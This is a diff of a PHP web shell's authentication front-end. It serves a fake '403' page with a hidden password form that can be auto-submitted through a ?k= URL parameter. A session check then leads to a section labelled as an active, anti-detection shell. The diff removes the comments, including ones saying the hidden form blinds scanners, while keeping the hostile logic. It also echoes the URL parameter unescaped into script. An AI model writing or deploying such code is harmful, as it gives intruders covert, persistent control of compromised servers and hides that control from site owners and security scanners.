@@ -1,22 +1,18 @@
 <?php
 session_start();
-$pass_hash = '$2y$10$BLrQhRtv0E7WzgiiyZbEnegndmfFwuzof9aJlvmYPDhUvuB1q3s9.'; // bcrypt
-
-// HIDDEN FORM (anti scanner)
+$pass_hash = '$2y$10$BLrQhRtv0E7WzgiiyZbEnegndmfFwuzof9aJlvmYPDhUvuB1q3s9.';
 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    $form_id = md5(time().rand(1,9999)); // Random ID
+    $form_id = md5(time().rand(1,9999));
     if(isset($_POST['pass']) && password_verify($_POST['pass'], $pass_hash)) {
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = time(); // Timestamp
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = time();
         header("Location: ".$_SERVER['PHP_SELF']."?success"); exit;
     }
 ?>
 <!DOCTYPE html><html><head><title>403</title><style>body{display:none;}</style></head><body>
-<!-- HIDDEN FORM - Scanner buta -->
 <form id="<?php echo $form_id; ?>" method="POST" style="display:none;">
 <input type="password" name="pass" autocomplete="off">
 </form>
 <script>
-// JS Trigger via URL ?k=PASS atau manual
 <?php if(isset($_GET['k'])): ?>
 document.getElementById('<?php echo $form_id; ?>').pass.value = "<?php echo $_GET['k']; ?>";
 document.getElementById('<?php echo $form_id; ?>').submit();
@@ -24,12 +20,9 @@ document.getElementById('<?php echo $form_id; ?>').submit();
 </script>
 </body></html>
 <?php exit; }
-
-// SESSION TIMEOUT 1 JAM
 if(time() - $_SESSION[md5($_SERVER['HTTP_HOST'])] > 3600) {
     session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); exit;
 }
-
 // ======================================
 // ✅ SHELL AKTIF - ANTI DETEKSI MODE
 // ======================================
